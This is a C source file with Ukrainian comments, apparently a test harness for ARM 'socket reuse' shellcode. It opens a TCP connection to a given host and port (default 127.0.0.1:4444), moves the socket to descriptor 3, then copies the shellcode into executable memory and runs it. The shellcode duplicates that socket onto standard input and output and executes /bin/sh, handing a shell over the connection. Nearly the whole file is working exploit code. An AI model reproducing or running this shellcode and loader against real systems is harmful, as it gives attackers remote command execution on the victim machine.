
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

// Функція для створення сокета та відкриття з'єднання
int create_socket(const char* ip, int port) {
    int sockfd;
    struct sockaddr_in addr;
    
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("socket");
        return -1;
    }
    
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_pton(AF_INET, ip, &addr.sin_addr);
    
    if (connect(sockfd, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        perror("connect");
        close(sockfd);
        return -1;
    }
    
    return sockfd;
}

int main(int argc, char *argv[]) {
    // Shell with Socket Reuse Shellcode
    unsigned char shellcode[] = "\x03\x40\xa0\xe3\x04\x00\xa0\xe1\x00\x10\xa0\xe3\x3f\x70\xa0\xe3\x00\x00\x00\xef\x04\x00\xa0\xe1\x01\x10\xa0\xe3\x3f\x70\xa0\xe3\x00\x00\x00\xef\x04\x00\xa0\xe1\x02\x10\xa0\xe3\x3f\x70\xa0\xe3\x00\x00\x00\xef\x18\x00\x8f\xe2\x00\x10\xa0\xe3\x00\x20\xa0\xe3\x0b\x70\xa0\xe3\x00\x00\x00\xef\x00\x00\xa0\xe3\x01\x70\xa0\xe3\x00\x00\x00\xef\x2f\x62\x69\x6e\x2f\x73\x68\x00";
    
    // Параметри для з'єднання
    const char* target_ip = "127.0.0.1";
    int target_port = 4444;
    
    if (argc > 1) target_ip = argv[1];
    if (argc > 2) target_port = atoi(argv[2]);
    
    printf("Довжина shellcode: %zu байт\n", sizeof(shellcode) - 1);
    printf("Підключення до %s:%d...\n", target_ip, target_port);
    
    // Створюємо з'єднання для тестування
    int sockfd = create_socket(target_ip, target_port);
    if (sockfd < 0) {
        fprintf(stderr, "Помилка при створенні з'єднання\n");
        return 1;
    }
    
    printf("З'єднання встановлено! Дескриптор сокета: %d\n", sockfd);
    
    // Налаштовуємо дескриптор сокета у відповідності з SOCKET_FD із шеллкоду
    // В реальному експлойті цей крок не потрібен, оскільки сокет вже відкритий
    if (sockfd != 3) {
        printf("Потрібно налаштувати дескриптор сокета (%d -> 3)\n", sockfd, 3);
        // Дублюємо сокет до потрібного FD
        for (int i = 0; i <= 3; i++) {
            if (i != sockfd) close(i);
        }
        dup2(sockfd, 3);
        close(sockfd);
        sockfd = 3;
        printf("Дескриптор сокета тепер: %d\n", sockfd);
    }
    
    printf("Виконання shellcode...\n");
    printf("Після цього ви отримаєте shell на з'єднанні.\n");
    
    // Виділяємо пам'ять з правами на виконання
    void *mem = mmap(NULL, sizeof(shellcode),
                     PROT_READ | PROT_WRITE | PROT_EXEC,
                     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (mem == MAP_FAILED) {
        perror("mmap");
        return 1;
    }
    
    // Копіюємо shellcode у виділену пам'ять
    memcpy(mem, shellcode, sizeof(shellcode));
    
    // Виконуємо shellcode
    ((void(*)())mem)();
    
    // Звільняємо пам'ять (до цього рядка ми не дійдемо, якщо execve успішний)
    munmap(mem, sizeof(shellcode));
    return 0;
}
